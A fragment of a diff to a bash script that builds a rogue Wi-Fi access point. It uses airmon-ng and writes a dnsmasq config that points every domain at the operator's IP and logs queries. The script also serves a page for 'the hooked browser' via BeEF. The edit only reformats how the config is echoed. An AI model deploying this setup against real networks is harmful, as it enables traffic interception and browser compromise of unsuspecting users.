@@ -218,15 +218,7 @@ while [[ $(id -u) == 0 ]] ; do
 			airmon-ng start $INTERFACE $NULL
 			clear
 			echo "Setting up your dnsmasq.conf ... "
-			echo "interface=at0
-            dhcp-range=10.0.0.10,10.0.0.250,12h
-            dhcp-option=3,10.0.0.1
-            dhcp-option=6,10.0.0.1
-            server=8.8.8.8
-            address=/#/$IPADDRESS
-            log-queries
-            log-dhcp
-            listen-address=127.0.0.1 " > /bin/dnsmasq.conf 
+			echo -e "interface=at0\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\naddress=/#/$IPADDRESS\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1 " > /bin/dnsmasq.conf  
 			sleep 1
 			echo "Optimizing your access point ... "
 			ifconfig $INTERFACE$MON down 
@@ -284,15 +276,7 @@ while [[ $(id -u) == 0 ]] ; do
 			airmon-ng start $INTERFACE $NULL
 			clear
 			echo "Setting up dnsmasq.conf ... "
-			echo "interface=at0
-            dhcp-range=10.0.0.10,10.0.0.250,12h
-            dhcp-option=3,10.0.0.1
-            dhcp-option=6,10.0.0.1
-            server=8.8.8.8
-            address=/#/$IPADDRESS
-            log-queries
-            log-dhcp
-            listen-address=127.0.0.1 " > /etc/beef/dnsmasq.conf 
+			echo -e "interface=at0\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\naddress=/#/$IPADDRESS\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1 " > /etc/beef/dnsmasq.conf 
 	        sleep 1
 	        echo "${yellow}Setting up python server for the hooked browser in another tab${resetColor}"
 			cd /var/www/html/
